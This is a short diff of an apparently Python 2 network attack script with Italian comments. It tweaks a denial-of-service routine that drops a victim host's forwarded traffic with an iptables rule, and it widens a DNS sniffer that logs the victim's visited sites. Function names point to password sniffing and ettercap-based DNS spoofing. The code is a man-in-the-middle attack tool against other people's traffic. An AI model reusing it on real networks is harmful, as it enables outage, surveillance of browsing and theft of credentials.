@@ -130,6 +130,7 @@ def selection(ip):
 	#per bloccare il traffico in uscita dall'host vittima bastera' impostare
 	#una regola iptables (attacco 0)
 	iptables_rule = "iptables --append FORWARD --in-interface "+iface+" --source "+target_host+" -j DROP"
+	print iptables_rule
  	os.system(iptables_rule) 
 	print "Traffic bloccked! Press ctrl+c to stop DOS!"
 
@@ -170,7 +171,7 @@ def sniff_callback(packet):
 #regole dello sniffer
     
     #analisi dei pacchetti DNS per creare la cronologia (attacco 2)[FUNZIONA CORRETTAMENTE]
-    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2 and packet.haslayer(IPv6):
+    if packet.haslayer(UDP) and packet.haslayer(DNS) and attack_sel == 2:
 	dns_port = 53
 	if packet[UDP].dport == dns_port:
 		website_read_url = packet[DNS].qd.qname
@@ -230,7 +231,6 @@ def pwd_sniff(iface):
 
 ##########################
 #FUNZIONI UTILI AL DNS SPOOFING
-
 
 def ettercap_file_editor():
 
